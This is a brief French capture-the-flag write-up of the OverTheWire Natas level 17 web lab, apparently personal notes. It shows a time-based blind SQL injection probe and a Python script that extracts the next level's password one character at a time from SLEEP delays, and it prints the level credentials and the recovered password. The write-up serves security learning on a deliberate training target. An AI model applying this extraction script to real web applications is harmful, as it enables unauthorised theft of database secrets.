username : natas17
password : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC



- On a un serveur qui ne renvoie pas la sortie (valid, error ou deny)
- On va donc tester avec un sleep dans notre injection SQL :
```SQL 
" OR IF(1=0, SLEEP(2), 0)#
```
Le serveur mets du temps pour répondre. On a une injection sql

On fait un script python et on build notre mot de passe : 
```python 
import requests
import time

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

url = "http://natas17.natas.labs.overthewire.org"

session = requests.Session()
session.auth = (username, password)

currentpass = []

while len(currentpass) < 32:
    for character in characters:
        payload = 'natas18" AND password LIKE BINARY "' + ''.join(currentpass) + character + '%" AND SLEEP(0.5) #'
        data = {"username": payload}
        start_time = time.time()
        response = session.post(url, data=data)
        end_time = time.time()
        time_taken = end_time - start_time
        if time_taken >= 0.5:
            currentpass.append(character)
            print("Current password:", ''.join(currentpass))
            break

print("Password Found:", ''.join(currentpass))
```



Le script va tester pour chaque caractere a chaque position le temps de reponse si c'est instantané alors c'est pas le bon caractère.
-> Mot de passe : **6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ**
